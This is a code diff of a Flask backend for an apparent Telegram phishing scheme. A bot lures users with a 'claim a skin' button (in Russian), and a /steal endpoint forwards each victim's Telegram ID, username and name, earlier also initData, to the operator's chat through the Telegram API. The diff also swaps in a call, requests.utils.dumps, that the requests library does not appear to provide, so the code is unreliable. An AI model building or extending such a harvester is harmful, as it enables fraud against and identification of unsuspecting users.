@@ -1,7 +1,5 @@
 from flask import Flask, request, jsonify
 import requests
-import json
-from datetime import datetime
 
 app = Flask(__name__)
 
@@ -16,33 +14,30 @@ def index():
 @app.route('/steal', methods=['POST'])
 def steal():
     data = request.get_json()
-    print(f"[{datetime.now()}] Received: {data}")
+    print(f"STEAL CALLED: {data}")
     
-    if data:
-        msg = f"🔥 **ЖЕРТВА** 🔥\n{datetime.now().strftime('%H:%M:%S')}\n"
-        
-        if data.get('user'):
-            u = data['user']
-            msg += f"ID: {u.get('id')}\n"
-            if u.get('username'):
-                msg += f"@{u.get('username')}\n"
-        
-        if data.get('initData'):
-            msg += f"\n`{data['initData'][:150]}`"
+    if data and data.get('id'):
+        msg = f"🔥 **ЖЕРТВА** 🔥\n\n"
+        msg += f"🆔 ID: {data['id']}\n"
+        if data.get('username'):
+            msg += f"📛 @{data['username']}\n"
+        if data.get('first_name'):
+            msg += f"📝 {data['first_name']}\n"
         
         url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
-        requests.post(url, json={'chat_id': CHAT_ID, 'text': msg[:500], 'parse_mode': 'Markdown'})
+        requests.post(url, json={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
         return jsonify({'status': 'ok'})
+    
     return jsonify({'status': 'error'}), 400
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
     data = request.get_json()
-    if 'message' in data:
+    if 'message' in data and data['message'].get('text') == '/start':
         chat_id = data['message']['chat']['id']
         keyboard = {"inline_keyboard": [[{"text": "🎁 Забрать скин", "web_app": {"url": WEBAPP_URL}}]]}
         url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
-        payload = {'chat_id': chat_id, 'text': "Нажми на кнопку", 'reply_markup': json.dumps(keyboard)}
+        payload = {'chat_id': chat_id, 'text': "Нажми на кнопку!", 'reply_markup': requests.utils.dumps(keyboard)}
         requests.post(url, json=payload)
     return jsonify({'ok': True})
 
